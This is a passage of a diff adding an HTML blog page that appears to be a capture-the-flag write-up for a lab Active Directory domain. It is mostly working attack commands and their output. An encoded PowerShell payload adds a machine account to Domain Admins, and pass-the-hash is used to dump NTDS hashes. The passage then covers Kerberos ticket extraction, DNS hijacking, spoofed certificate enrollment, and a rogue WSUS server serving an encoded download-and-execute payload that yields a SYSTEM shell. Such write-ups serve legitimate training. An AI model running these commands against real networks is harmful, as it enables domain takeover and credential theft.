+    <span class="nt">-c</span> <span class="s1">'/accepteula /s powershell.exe -ep bypass -e "QQBkAGQALQBBAEQARwByAG8AdQBwAE0AZQBtAGIAZQByACAALQBJAGQAZQBuAHQAaQB0AHkAIAAiAEQAbwBtAGEAaQBuACAAQQBkAG0AaQBuAHMAIgAgAC0ATQBlAG0AYgBlAHIAcwAgACIATQBTAEEAXwBIAEUAQQBMAFQASAAkACIA"'</span>
+</code></pre></div></div>
+
+<p>Once the 120-second scheduled task loop triggers, the Domain Controller executes the update, silently promoting the machine account.</p>
+
+<p>We can verify the exploit worked by querying LDAP with <strong>NetExec</strong>, passing the <code class="language-plaintext highlighter-rouge">msa_health$</code> account and its NTLM hash. As shown below, <code class="language-plaintext highlighter-rouge">msa_health$</code> is now a confirmed member of the <code class="language-plaintext highlighter-rouge">Domain Admins</code> group:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜ nxc ldap dc01.logging.htb <span class="se">\</span>
+        <span class="nt">-u</span> <span class="s1">'msa_health$'</span> <span class="nt">-H</span> <span class="s1">'603fc24ee01a9409f83c9d1d701485c5'</span> <span class="se">\</span>
+        <span class="nt">--groups</span> <span class="s1">'Domain Admins'</span>
+LDAP        10.129.245.130    389    DC01             <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 / Server 2019 Build 17763 <span class="o">(</span>name:DC01<span class="o">)</span> <span class="o">(</span>domain:logging.htb<span class="o">)</span> <span class="o">(</span>signing:None<span class="o">)</span> <span class="o">(</span>channel binding:Never<span class="o">)</span>
+LDAP        10.129.245.130    389    DC01             <span class="o">[</span>+] logging.htb<span class="se">\m</span>sa_health<span class="nv">$:</span>603fc24ee01a9409f83c9d1d701485c5
+LDAP        10.129.245.130    389    DC01             Administrator
+LDAP        10.129.245.130    389    DC01             toby.brynleigh
+LDAP        10.129.245.130    389    DC01             msa_health<span class="err">$</span>
+</code></pre></div></div>
+
+<p>With Domain Admin privileges successfully granted to an account we hold the hash for, we can immediately utilize Pass-the-Hash (PtH) to dump the active directory database (<code class="language-plaintext highlighter-rouge">NTDS.dit</code>) and compromise the entire network.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜ nxc smb dc01.logging.htb <span class="se">\</span>
+        <span class="nt">-u</span> <span class="s1">'msa_health$'</span> <span class="nt">-H</span> <span class="s1">'603fc24ee01a9409f83c9d1d701485c5'</span> <span class="se">\</span>
+        <span class="nt">--ntds</span>
+SMB         10.129.245.130    445    DC01             <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 / Server 2019 Build 17763 x64 <span class="o">(</span>name:DC01<span class="o">)</span> <span class="o">(</span>domain:logging.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:None<span class="o">)</span> <span class="o">(</span>Null Auth:True<span class="o">)</span>
+SMB         10.129.245.130    445    DC01             <span class="o">[</span>+] logging.htb<span class="se">\m</span>sa_health<span class="nv">$:</span>603fc24ee01a9409f83c9d1d701485c5 <span class="o">(</span>Pwn3d!<span class="o">)</span>
+SMB         10.129.245.130    445    DC01             <span class="o">[</span>+] Dumping the NTDS, this could take a <span class="k">while </span>so go grab a redbull...
+SMB         10.129.245.130    445    DC01             Administrator:500:aad3b435b51404eeaad3b435b51404ee:a0c1d1bed9126632f5f1f2b3f790bdb5:::
+</code></pre></div></div>
+
+<hr />
+
+<h2 id="appendix-b-remote-identity-pivot-tgt-extraction">Appendix B: Remote Identity Pivot (TGT Extraction)</h2>
+
+<p>Rather than performing certificate enrollment directly on the target host (which requires dropping more binaries or executing complex commands on the DC), we can “teleport” our identity back to our attacker machine. This method is cleaner and allows us to use our full suite of local tools.</p>
+
+<h3 id="1-extracting-the-tgt-with-rubeus">1. Extracting the TGT with Rubeus</h3>
+
+<p>From our reverse shell as <code class="language-plaintext highlighter-rouge">jaylee.clifton</code>, we execute Rubeus with the <code class="language-plaintext highlighter-rouge">tgtdeleg</code> action. This leverages the GSS-API to request a delegation-ready TGT for the current user without requiring administrative privileges.</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PS</span><span class="w"> </span><span class="nx">C:\temp</span><span class="err">&gt;</span><span class="w"> </span><span class="o">.</span><span class="nx">\Rubeus.exe</span><span class="w"> </span><span class="nx">tgtdeleg</span><span class="w"> </span><span class="nx">/nowrap</span><span class="w">
+
+</span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="n">Action:</span><span class="w"> </span><span class="nx">Request</span><span class="w"> </span><span class="nx">Fake</span><span class="w"> </span><span class="nx">Delegation</span><span class="w"> </span><span class="nx">TGT</span><span class="w"> </span><span class="p">(</span><span class="n">current</span><span class="w"> </span><span class="nx">user</span><span class="p">)</span><span class="w">
+</span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="n">Initializing</span><span class="w"> </span><span class="nx">Kerberos</span><span class="w"> </span><span class="nx">GSS-API</span><span class="w"> </span><span class="nx">w/</span><span class="w"> </span><span class="nx">fake</span><span class="w"> </span><span class="nx">delegation</span><span class="w"> </span><span class="nx">for</span><span class="w"> </span><span class="nx">target</span><span class="w"> </span><span class="s1">'cifs/DC01.logging.htb'</span><span class="w">
+</span><span class="p">[</span><span class="o">+</span><span class="p">]</span><span class="w"> </span><span class="n">Kerberos</span><span class="w"> </span><span class="nx">GSS-API</span><span class="w"> </span><span class="nx">initialization</span><span class="w"> </span><span class="nx">success</span><span class="o">!</span><span class="w">
+</span><span class="p">[</span><span class="o">+</span><span class="p">]</span><span class="w"> </span><span class="n">Delegation</span><span class="w"> </span><span class="nx">request</span><span class="w"> </span><span class="nx">success</span><span class="o">!</span><span class="w"> </span><span class="nx">AP-REQ</span><span class="w"> </span><span class="nx">delegation</span><span class="w"> </span><span class="nx">ticket</span><span class="w"> </span><span class="nx">is</span><span class="w"> </span><span class="nx">now</span><span class="w"> </span><span class="nx">in</span><span class="w"> </span><span class="nx">GSS-API</span><span class="w"> </span><span class="nx">output.</span><span class="w">
+</span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="n">Found</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">AP-REQ</span><span class="w"> </span><span class="nx">delegation</span><span class="w"> </span><span class="nx">ticket</span><span class="w"> </span><span class="nx">in</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">GSS-API</span><span class="w"> </span><span class="nx">output.</span><span class="w">
+</span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="n">base64</span><span class="p">(</span><span class="n">ticket.kirbi</span><span class="p">):</span><span class="w">
+
+      </span><span class="n">doIFyDCCBcSgAwIB...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span><span class="nf">LkhUQqkgMB6gAwIBAqEXMBUbBmtyYnRndBsLTE9HR0lORy5IVEI</span><span class="o">=</span><span class="w">
+</span></code></pre></div></div>
+
+<h3 id="2-converting-to-linux-format-ccache">2. Converting to Linux Format (.ccache)</h3>
+
+<p>Windows uses the <code class="language-plaintext highlighter-rouge">.kirbi</code> format, while Linux tools like Impacket and Certipy expect <code class="language-plaintext highlighter-rouge">.ccache</code>. We save the Base64 blob to a file and convert it using <code class="language-plaintext highlighter-rouge">ticketConverter.py</code>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Decode the ticket</span>
+➜ <span class="nb">echo</span> <span class="s1">'oIFyDCCBcSgAwIB...[snip]...LkhUQqkgMB6gAwIBAqEXMBUbBmtyYnRndBsLTE9HR0lORy5IVEI='</span> | <span class="nb">base64</span> <span class="nt">-d</span> <span class="o">&gt;</span> jaylee.clifton.kirbi
+
+<span class="c"># Convert the ticket</span>
+➜ ticketConverter.py jaylee.clifton.kirbi jaylee.clifton.ccache
+Impacket v0.14.0.dev0+20260420.123356.9afc09b9 - Copyright Fortra, LLC and its affiliated companies
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> converting kirbi to ccache...
+<span class="o">[</span>+] <span class="k">done</span>
+</code></pre></div></div>
+
+<h3 id="3-verifying-the-identity">3. Verifying the Identity</h3>
+
+<p>We verify that the ticket is valid and correctly reflects the <code class="language-plaintext highlighter-rouge">jaylee.clifton</code> principal using <code class="language-plaintext highlighter-rouge">klist</code>. Note the timestamp synchronization (April 2026) required for the target environment.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜ klist jaylee.clifton.ccache
+Ticket cache: FILE:jaylee.clifton.ccache
+Default principal: jaylee.clifton@LOGGING.HTB
+
+Valid starting       Expires              Service principal
+04/23/2026 08:45:05  04/23/2026 14:59:15  krbtgt/LOGGING.HTB@LOGGING.HTB
+</code></pre></div></div>
+
+<h3 id="4-remote-dns-hijacking-via-kerberos">4. Remote DNS Hijacking via Kerberos</h3>
+
+<p>With the identity active on our attacker machine, we use <strong>bloodyAD</strong> to perform the DNS hijacking remotely. We wrap the command in <code class="language-plaintext highlighter-rouge">fake_time</code> to sync with the DC’s 2026 clock and add an A-record for <code class="language-plaintext highlighter-rouge">wsus</code> pointing to our IP.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜ fake_time dc01.logging.htb <span class="se">\</span>
+<span class="nb">env </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>jaylee.clifton.ccache <span class="se">\</span>
+bloodyAD <span class="nt">-H</span> dc01.logging.htb <span class="nt">-d</span> logging.htb <span class="se">\</span>
+    <span class="nt">-u</span> <span class="s1">'jaylee.clifton'</span> <span class="nt">-k</span> <span class="se">\</span>
+    add dnsRecord <span class="s1">'wsus'</span> <span class="s2">"10.10.16.25"</span>
+<span class="o">[</span>+] wsus has been successfully added
+
+<span class="c"># Verify from target shell:</span>
+PS C:<span class="se">\t</span>emp&gt; Resolve-DnsName wsus.logging.htb
+wsus.logging.htb  A  180  Answer  10.10.16.25
+</code></pre></div></div>
+
+<h3 id="5-remote-enrollment-via-certipy">5. Remote Enrollment via Certipy</h3>
+
+<p>Next, we use <strong>Certipy</strong> to request the spoofed certificate. Since we are using our exported Kerberos ticket, we don’t need a password. We specify the <code class="language-plaintext highlighter-rouge">UpdateSrv</code> template and our spoofed DNS name.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜ fake_time dc01.logging.htb <span class="se">\</span>
+<span class="nb">env </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>jaylee.clifton.ccache <span class="se">\</span>
+certipy req <span class="se">\</span>
+  <span class="nt">-u</span> <span class="s1">'jaylee.clifton@logging.htb'</span> <span class="nt">-k</span> <span class="se">\</span>
+  <span class="nt">-target</span> dc01.logging.htb <span class="nt">-dc-host</span> dc01.logging.htb <span class="nt">-dc-ip</span> <span class="s2">"</span><span class="nv">$target_ip</span><span class="s2">"</span> <span class="se">\</span>
+  <span class="nt">-ca</span> <span class="s1">'logging-DC01-CA'</span> <span class="nt">-template</span> <span class="s1">'UpdateSrv'</span> <span class="se">\</span>
+  <span class="nt">-dns</span> <span class="s1">'wsus.logging.htb'</span>
+</code></pre></div></div>
+
+<h3 id="6-final-certificate-preparation">6. Final Certificate Preparation</h3>
+
+<p>To use the generated PFX with our rogue WSUS server, we extract the certificate and private key and concatenate them into a single PEM file.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜ certipy cert <span class="nt">-pfx</span> wsus.pfx <span class="nt">-nokey</span> <span class="nt">-out</span> wsus.crt
+Certipy v5.0.4 - by Oliver Lyak <span class="o">(</span>ly4k<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Writing certificate to <span class="s1">'wsus.crt'</span>
+
+➜ certipy cert <span class="nt">-pfx</span> wsus.pfx <span class="nt">-nocert</span> <span class="nt">-out</span> wsus.key
+Certipy v5.0.4 - by Oliver Lyak <span class="o">(</span>ly4k<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Writing private key to <span class="s1">'wsus.key'</span>
+
+➜ <span class="nb">cat </span>wsus.crt wsus.key <span class="o">&gt;</span> wsus.pem
+</code></pre></div></div>
+
+<h3 id="7-executing-the-attack--final-compromise">7. Executing the Attack &amp; Final Compromise</h3>
+
+<p>With the DNS record redirected and our trusted certificate in hand, we map the spoofed domain to our local IP in <code class="language-plaintext highlighter-rouge">/etc/hosts</code> and prepare our listener. Finally, we launch <strong>wsuks</strong> to serve the malicious update. Because we are using a certificate signed by the Domain CA for the <code class="language-plaintext highlighter-rouge">wsus.logging.htb</code> hostname, the Domain Controller will trust the connection implicitly.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Mapping the host locally</span>
+➜ <span class="nb">echo</span> <span class="s2">"10.10.16.25 wsus.logging.htb"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
+10.10.16.25 wsus.logging.htb
+
+<span class="c"># Starting the listener</span>
+➜ rlwrap <span class="nt">-cAr</span> ncat <span class="nt">-lnvp</span> 9002
+
+<span class="c"># Running the rogue WSUS server</span>
+➜ <span class="nb">sudo </span>wsuks <span class="nt">--serve-only</span> <span class="se">\</span>
+    <span class="nt">--WSUS-Server</span> wsus.logging.htb <span class="se">\</span>
+    <span class="nt">--tls-cert</span> wsus.pem <span class="se">\</span>
+    <span class="nt">-I</span> tun0 <span class="se">\</span>
+    <span class="nt">-c</span> <span class="s1">'/accepteula /s powershell.exe -ep bypass -nop -w hidden -e "SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAIgBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANgAuADIAMQA0AC8AcwBoAGUAbABsAC4AcABzADEAIgApAA=="'</span>
+
+<span class="c"># Shell as Administrator</span>
+PS C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; <span class="nb">whoami</span><span class="p">;</span> <span class="nb">hostname
+</span>nt authority<span class="se">\s</span>ystem
+DC01
+</code></pre></div></div>
+
+    </main>
+
+    <footer class="site-footer">
+        <div class="social-links">
+            <a href="https://x.com/thesecretmyth" target="_blank" rel="noopener noreferrer">X</a>
+            <a href="https://github.com/thesecretmyth" target="_blank" rel="noopener noreferrer">GitHub</a>
+        </div>
+    </footer>
+
+    <script>
+        const toggleBtn = document.getElementById('theme-toggle');
+        const themeIcon = document.getElementById('theme-icon');
+        const currentTheme = localStorage.getItem('theme') || 'dark';
+
+        if (currentTheme === 'light') {
+            document.body.classList.add('light-mode');
+            themeIcon.textContent = '☀️';
+        }
+
+        toggleBtn.addEventListener('click', () => {
+            document.body.classList.toggle('light-mode');
+            let theme = 'dark';
+            themeIcon.textContent = '🌙';
+
+            if (document.body.classList.contains('light-mode')) {
+                theme = 'light';
+                themeIcon.textContent = '☀️';
+            }
+            localStorage.setItem('theme', theme);
+        });
+    </script>
+</body>
+
+</html>
